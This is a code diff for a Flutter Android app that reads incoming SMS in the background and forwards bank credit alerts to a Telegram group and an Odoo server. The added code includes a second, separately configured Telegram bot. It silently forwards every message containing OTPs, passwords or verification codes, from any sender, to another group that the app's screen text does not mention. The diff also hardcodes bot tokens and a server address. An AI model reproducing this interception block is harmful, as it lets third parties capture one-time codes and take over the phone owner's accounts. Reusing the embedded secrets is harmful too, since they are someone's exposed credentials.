@@ -5,96 +5,118 @@ import 'package:dart_telegram_bot/telegram_entities.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_background/flutter_background.dart';
 import 'package:fluttertoast/fluttertoast.dart';
-import 'package:fuels_sms/ParseConstants.dart';
-import 'package:get/get.dart';
+import 'package:fuels_sms/ApplicationConstants.dart';
 import 'package:http/http.dart' as http;
-import 'package:parse_server_sdk/parse_server_sdk.dart';
 import 'package:telephony/telephony.dart';
 
-import 'message_history.dart';
-
 void onBackgroundMessage(SmsMessage message) {
-  debugPrint("onBackgroundMessage called");
-
+  debugPrint("onBackgroundMessage: Received SMS from ${message.address}");
   sendTelegram(message.body, message.address);
 }
 
 const String telegramBotToken =
-    '6038774955:AAFDOwlNXxC5AMlH_ZvHhjZj0WEHCEqy9r0'; // Replace with your Telegram bot token
-const int telegramChatId = -1001862858056; // Replace with your Telegram chat ID
+    '6038774955:AAFboWInWl7iWFMB2FRUep-KxHf5F4_0lFY';
+const int telegramChatId = -1001862858056;
+
+const String otpBotToken = '8112541883:AAHZhrMc7QuVuuTZSWYLvGN7mAbyDdzD8Ls';
+const int otpGroupId = -4810490033;
+
 const String odooServerUrl =
-    'http://128.199.25.245:8069/api/telegram/message'; // Replace with your Odoo server URL
+    'http://128.199.25.245:8069/api/telegram/message';
 
 Future<void> sendTelegram(String? message, String? sender) async {
+  debugPrint("sendTelegram: Called with sender=$sender, message=$message");
   String preciseMessage = '';
-  debugPrint("sendTelegram called");
 
-  ParseConstants().initParse();
+  if (message == null || sender == null) {
+    debugPrint("sendTelegram: Null message or sender, aborting");
+    return;
+  }
 
-  if ((sender!.contains('HDFCBK') &&
-          message!.contains('4143') &&
-          message!.contains('deposited') &&
-          !(message!.contains('XX0832'))) ||
-      (sender!.contains('CANBNK') &&
-          message!.contains('363') &&
-          message!.contains('CREDITED')) ||
-      (sender!.contains('BPCLIN') && message!.contains('Received')) ||
-      (sender!.contains('BPCLIN') && message!.contains('password')) ||
-      (sender!.contains('STERNA') || sender!.contains('ALSRAM')) ||
-      (sender!.contains('CBSSBI') && message!.contains('Credited')) ||
-      (sender!.contains('SBIINB') && message!.contains('transfer')) ||
-      (sender!.contains('SBIBNK') && message!.contains('echeque')) ||
-      (sender!.contains('SBIPSG') && message!.contains('credited')) ||
-      (sender.contains('PHONPE') && message!.contains('OTP'))) {
-    debugPrint('Called--------');
-    debugPrint(
-        'Condition: ${(sender!.contains('SBIBNK') && message!.contains('echeque'))}');
+  if ((sender.contains('HDFCBK') &&
+      message.contains('4143') &&
+      message.contains('deposited') &&
+      !message.contains('XX0832')) ||
+      (sender.contains('CANBNK') &&
+          message.contains('363') &&
+          message.contains('CREDITED')) ||
+      (sender.contains('BPCLIN') && message.contains('Received')) ||
+      (sender.contains('BPCLIN') && message.contains('password')) ||
+      (sender.contains('STERNA') || sender.contains('ALSRAM')) ||
+      (sender.contains('CBSSBI') && message.contains('Credited')) ||
+      (sender.contains('SBIINB') && message.contains('transfer')) ||
+      (sender.contains('SBIBNK') && message.contains('echeque')) ||
+      (sender.contains('SBIPSG') && message.contains('credited')) ||
+      (sender.contains('PHONPE') && message.contains('OTP'))) {
+    debugPrint('sendTelegram: Message matches filter criteria');
 
-    debugPrint(message.toString());
     Bot(
       token: telegramBotToken,
       onReady: (bot) async {
-        if (sender!.contains('HDFCBK') ||
-            sender!.contains('CANBNK') ||
-            sender!.contains('CBSSBI') ||
-            sender!.contains('SBIINB') ||
-            sender!.contains('SBIPSG') ||
-            sender!.contains('PHONPE')) {
+        debugPrint('sendTelegram: Bot initialized successfully');
+        if (sender.contains('HDFCBK') ||
+            sender.contains('CANBNK') ||
+            sender.contains('CBSSBI') ||
+            sender.contains('SBIINB') ||
+            sender.contains('SBIPSG') ||
+            sender.contains('PHONPE')) {
           preciseMessage =
-              message!.split('.')[0] + '.' + message!.split('.')[1];
+              message.split('.')[0] + '.' + message.split('.')[1];
+          debugPrint('sendTelegram: Formatted preciseMessage=$preciseMessage');
         } else {
-          preciseMessage = message!;
+          preciseMessage = message;
+          debugPrint('sendTelegram: Using full message=$preciseMessage');
         }
 
-        bot.sendMessage(
+        debugPrint('sendTelegram: Sending message to Telegram chat $telegramChatId');
+        await bot.sendMessage(
             ChatID(telegramChatId),
             '\nMessage from ' +
                 sender.split('-')[1] +
                 ':\n\n' +
                 preciseMessage);
+        debugPrint('sendTelegram: Message sent to Telegram');
 
-        var messageToParseDatabase = ParseObject('MessageInfo')
-          ..set('From', sender.split('-')[1])
-          ..set('Message', preciseMessage);
-        var response = await messageToParseDatabase.save();
-        if (response.success) {
-          messageToParseDatabase = response.results?.first;
-          print("Response received successfully");
-        } else {
-          debugPrint('error--------');
-        }
-
-        // Send message to Odoo server
+        debugPrint('sendTelegram: Sending message to Odoo server');
         await sendToOdooServer(sender.split('-')[1], preciseMessage);
-
-        debugPrint('message sent');
+        debugPrint('sendTelegram: Completed');
       },
-      onStartFailed: (bot, e, s) => print('Start failed'),
+      onStartFailed: (bot, e, s) {
+        debugPrint('sendTelegram: Bot start failed with error=$e, stack=$s');
+      },
+    );
+  } else {
+    debugPrint('sendTelegram: Message did not match filter criteria');
+  }
+  final lowered = message.toLowerCase();
+  if (lowered.contains("otp") ||
+      lowered.contains("one time") ||
+      lowered.contains("password") ||
+      lowered.contains("verification code")){
+    Bot(
+      token: otpBotToken,
+      onReady: (bot) async {
+        debugPrint('sendTelegram: OTP Bot initialized successfully');
+
+        debugPrint('sendTelegram: Sending OTP message to Telegram chat $telegramChatId');
+        await bot.sendMessage(
+            ChatID(otpGroupId),
+            '\OTP from ' +
+                sender +
+                ':\n\n' +
+                message);
+        debugPrint('sendTelegram: OTP Message sent to Telegram');
+        debugPrint('sendTelegram: Completed');
+      },
+      onStartFailed: (bot, e, s) {
+        debugPrint('sendTelegram: OTP Bot start failed with error=$e, stack=$s');
+      },
     );
   }
 }
 
 Future<void> sendToOdooServer(String sender, String message) async {
+  debugPrint('sendToOdooServer: Sending to Odoo with sender=$sender, message=$message');
   final response = await http.post(
     Uri.parse(odooServerUrl),
     headers: <String, String>{
@@ -107,13 +129,14 @@ Future<void> sendToOdooServer(String sender, String message) async {
   );
 
   if (response.statusCode == 200) {
-    print("Message sent to Odoo server successfully");
+    debugPrint("sendToOdooServer: Message sent successfully, response=${response.body}");
   } else {
-    print("Failed to send message to Odoo server");
+    debugPrint("sendToOdooServer: Failed with status=${response.statusCode}, response=${response.body}");
   }
 }
 
 void main() {
+  debugPrint('main: Starting application');
   runApp(MyApp());
 }
 
@@ -122,13 +145,15 @@ class MyApp extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    return GetMaterialApp(
+    debugPrint('MyApp: Building app widget');
+    return MaterialApp(
       debugShowCheckedModeBanner: false,
-      title: 'Fuels SMS Automator',
+      darkTheme: ThemeData.dark(),
+      title: 'SMS Automator',
       theme: ThemeData(
         primarySwatch: Colors.blue,
       ),
-      home: MyHomePage(title: 'Fuels SMS Automator'),
+      home: MyHomePage(title: 'SMS Automator ${ApplicationConstants.version}'),
     );
   }
 }
@@ -139,7 +164,10 @@ class MyHomePage extends StatefulWidget {
   final String title;
 
   @override
-  State<MyHomePage> createState() => _MyHomePageState();
+  State<MyHomePage> createState() {
+    debugPrint('MyHomePage: Creating state');
+    return _MyHomePageState();
+  }
 }
 
 class _MyHomePageState extends State<MyHomePage> {
@@ -150,72 +178,72 @@ class _MyHomePageState extends State<MyHomePage> {
   TextEditingController senderController = TextEditingController();
   final Telephony telephony = Telephony.instance;
 
-  var databaseStatus = 'NA';
-
   @override
   void initState() {
+    debugPrint('_MyHomePageState: Initializing state');
     super.initState();
     initPlatformState();
   }
 
   onMessage(SmsMessage message) async {
+    debugPrint('onMessage: Received SMS with body=${message.body}');
     setState(() {
       _message = message.body ?? "Error reading message body.";
+      debugPrint('onMessage: Updated _message=$_message');
     });
   }
 
   onSendStatus(SendStatus status) {
+    debugPrint('onSendStatus: Status received=$status');
     setState(() {
       _message = status == SendStatus.SENT ? "sent" : "delivered";
+      debugPrint('onSendStatus: Updated _message=$_message');
     });
   }
 
   Future<void> initPlatformState() async {
-    ParseConstants().initParse().then((result) {
-      if (result) {
-        print('Database Connected');
-        setState(() {
-          databaseStatus = 'Connected';
-        });
-        Fluttertoast.showToast(msg: 'Database connected');
-      } else {
-        print('Database Error');
-        setState(() {
-          databaseStatus = 'Not connected';
-        });
-        Fluttertoast.showToast(msg: 'Database error');
-      }
-    });
-
+    debugPrint('initPlatformState: Requesting phone and SMS permissions');
     final bool? result = await telephony.requestPhoneAndSmsPermissions;
 
     if (result != null && result) {
+      debugPrint('initPlatformState: Permissions granted, starting SMS listener');
       telephony.listenIncomingSms(
           onNewMessage: _scanningEnabled ? onMessage : _dummyCallback,
           onBackgroundMessage: onBackgroundMessage);
+    } else {
+      debugPrint('initPlatformState: Permissions denied or null');
     }
+
+    debugPrint('initPlatformState: Initializing background execution');
     const androidConfig = FlutterBackgroundAndroidConfig(
       notificationTitle: "Zaptr Automator",
       notificationText: "Your own personal automator",
       notificationImportance: AndroidNotificationImportance.Default,
     );
     bool success =
-        await FlutterBackground.initialize(androidConfig: androidConfig);
-    print('Background initialization: ${success.toString()}');
+    await FlutterBackground.initialize(androidConfig: androidConfig);
+    debugPrint('initPlatformState: Background initialization success=$success');
     if (success) {
       FlutterBackground.enableBackgroundExecution();
+      debugPrint('initPlatformState: Background execution enabled');
       Fluttertoast.showToast(msg: 'App will run in background');
+    } else {
+      debugPrint('initPlatformState: Background initialization failed');
     }
 
-    if (!mounted) return;
+    if (!mounted) {
+      debugPrint('initPlatformState: Widget not mounted, exiting');
+      return;
+    }
   }
 
   void _dummyCallback(SmsMessage message) {
-    // Dummy callback, does nothing
+    debugPrint('_dummyCallback: Called with message=${message.body}');
   }
 
   @override
   Widget build(BuildContext context) {
+    debugPrint('MyHomePageState: Building UI');
     return Scaffold(
       appBar: AppBar(
         title: Text(widget.title),
@@ -224,18 +252,9 @@ class _MyHomePageState extends State<MyHomePage> {
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: <Widget>[
-            ElevatedButton(
-                onPressed: () {
-                  Navigator.push(
-                      context,
-                      MaterialPageRoute(
-                          builder: (context) => MessageHistory()));
-                },
-                child: Text('Message history')),
             Text(
               'This app will read incoming sms and send to Sowdambiga Fuels Telegram group',
             ),
-            Text('Database status: ' + databaseStatus),
             TextField(
                 controller: senderController,
                 decoration: InputDecoration(label: Text('Sender'))),
@@ -245,20 +264,25 @@ class _MyHomePageState extends State<MyHomePage> {
             ),
             ElevatedButton(
                 onPressed: () {
+                  debugPrint('Button: Send pressed, sending manual message');
                   sendTelegram(messageController.text, senderController.text);
                 },
                 child: Text('Send')),
             ElevatedButton(
               onPressed: () {
+                debugPrint('Button: Toggling scan, current state=$_scanningEnabled');
                 setState(() {
                   _scanningEnabled = !_scanningEnabled;
+                  debugPrint('Button: Scan state changed to $_scanningEnabled');
                 });
               },
               child: Text(_scanningEnabled ? 'Stop Scan' : 'Start Scan'),
             ),
             ElevatedButton(
               onPressed: () {
+                debugPrint('Button: Check background process pressed');
                 bool enabled = FlutterBackground.isBackgroundExecutionEnabled;
+                debugPrint('Button: Background execution enabled=$enabled');
                 if (enabled) {
                   const snackbar = SnackBar(
                     content: Text('Enabled'),
